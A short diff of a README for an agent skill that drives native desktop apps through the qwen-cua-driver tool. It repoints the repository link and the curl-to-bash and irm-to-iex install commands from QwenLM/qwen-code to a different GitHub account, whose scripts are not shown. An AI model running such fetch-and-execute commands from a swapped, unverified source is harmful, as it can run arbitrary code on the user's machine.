@@ -2,7 +2,7 @@
 
 This cross-agent skill teaches an AI agent to operate native applications on
 macOS, Windows, and Linux with the
-[`qwen-cua-driver`](https://github.com/QwenLM/qwen-code/tree/main/packages/cua-driver/rust)
+[`qwen-cua-driver`](https://github.com/LailatulCoder/lailatul-coder/tree/main/packages/cua-driver/rust)
 CLI or MCP server.
 
 It covers the canonical snapshot-action-verify loop, exact window addressing,
@@ -16,13 +16,13 @@ failure before a caller escalates to foreground input.
 macOS or Linux:
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/QwenLM/qwen-code/main/packages/cua-driver/scripts/install.sh)"
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/LailatulCoder/lailatul-coder/main/packages/cua-driver/scripts/install.sh)"
 ```
 
 Windows PowerShell:
 
 ```powershell
-irm https://raw.githubusercontent.com/QwenLM/qwen-code/main/packages/cua-driver/scripts/install.ps1 | iex
+irm https://raw.githubusercontent.com/LailatulCoder/lailatul-coder/main/packages/cua-driver/scripts/install.ps1 | iex
 ```
 
 Then verify the current host:
